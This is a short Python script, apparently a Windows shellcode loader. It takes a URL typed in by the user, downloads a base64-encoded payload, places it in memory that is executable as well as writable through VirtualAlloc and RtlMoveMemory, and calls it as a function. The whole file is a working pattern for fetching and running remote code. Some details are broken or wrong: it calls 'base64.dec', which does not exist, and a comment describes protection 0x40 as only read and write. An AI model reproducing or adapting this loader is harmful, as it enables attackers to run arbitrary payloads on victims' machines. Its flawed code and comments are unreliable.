from asyncore import write
from urllib import request

import base64
import ctypes

kernel32 = ctypes.windll.kernel32

# Get a binary from a url and return it
def get_code(url):
    with request.urlopen(url) as response:
        shellcode = base64.dec(response.read())
    return shellcode

# Put the shellcode into memory manually returns a pointer
def write_memory(buf):
    length = len(buf)

    # Ensures the code can be ran on 64-bit and 32-bit arch
    # Virtual Alloc results are a pointer
    kernel32.VirtualAlloc.restype = ctypes.c_void_p
    # RTL args are two pointers and a size
    kernel32.RtlMoveMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)

    # Allocate the memory space
    ptr = kernel32.VirtualAlloc(None, length, 0x3000, 0x40)     # 0x40 = read and write access
    # Move the buffer (shellcode) into the allocated new buffer (ptr)
    kernel32.RtlMoveMemory(ptr, buf, length)
    return ptr

# Run the shellcode (self explanitory)
def run(shellcode):
    # Create a buffer for the decoded shellcode
    buffer = ctypes.create_string_buffer(shellcode)

    ptr = write_memory(buffer)

    # Cast the buffer to act as function pointer - can now call the shellcode like a normal python function
    shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
    shell_func()

if __name__ == "__main__":
    url = input("Enter url to shellcode")
    shellcode = get_code(url)
    run(shellcode)